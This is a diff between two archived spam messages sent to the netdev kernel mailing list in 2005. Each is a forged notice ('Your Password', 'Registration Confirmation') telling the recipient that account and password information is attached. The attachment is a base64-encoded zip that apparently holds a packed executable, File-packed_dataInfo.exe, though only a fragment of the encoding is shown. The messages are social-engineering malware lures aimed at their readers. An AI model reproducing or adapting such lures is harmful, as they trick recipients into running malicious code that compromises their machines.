@@ -1,26 +1,26 @@
-From: hostmaster@t-online.de
-Subject: Your Password
-Date: Sun, 25 Dec 2005 06:05:03 UTC
-Message-ID: <edfc95.3da2380b642@t-online.de>
+From: office@interpack.com.cn
+Subject: Registration Confirmation
+Date: Sun, 25 Dec 2005 05:41:04 UTC
+Message-ID: <f0d310.cc214f3e922@interpack.com.cn>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="======a0a751caedfd.38a3fb81"
+Content-Type: multipart/mixed; boundary="======c3cbade2b02f18ec"
 Content-Transfer-Encoding: 7bit
 Return-path: <netdev-bounce@oss.sgi.com>
-To: majordomo@oss.sgi.com
+To: netdev@oss.sgi.com
 Sender: netdev-bounce@oss.sgi.com
 Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
 This is a multi-part message in MIME format.
 
---======a0a751caedfd.38a3fb81
+--======c3cbade2b02f18ec
 
 Account and Password Information are attached!
 
 
-***** Go to: http://www.t-online.de
-***** Email: postman@t-online.de
---======a0a751caedfd.38a3fb81
+***** Go to: http://www.interpack.com.cn
+***** Email: postman@interpack.com.cn
+--======c3cbade2b02f18ec
 Content-Type: application/octet-stream; name=reg_pass-data.zip
 Content-Transfer-Encoding: base64
 Content-Disposition: attachment; filename="reg_pass-data.zip"
@@ -1000,4 +1000,4 @@ RmhMTDZoTEwxTExoVExYVlBYaCQ7ekwyaEUpUjlSekJoRXpXaEUpUjlyemhFKVI5cnpCaExEU1M2
 aFlFKVIgYkM0dmgxU1BMWEwwUlZoMVNQTFgxMWgxU1BMWHIxaHpYYlBLAQIUAAoAAAAAAACQdjPM
 yus3XtgAAF7YAAAYAAAAAAAAAAAAIAD/gQAAAABGaWxlLXBhY2tlZF9kYXRhSW5mby5leGVQSwUG
 AAAAAAEAAQBGAAAAlNgAAAAA
---======a0a751caedfd.38a3fb81--
+--======c3cbade2b02f18ec--
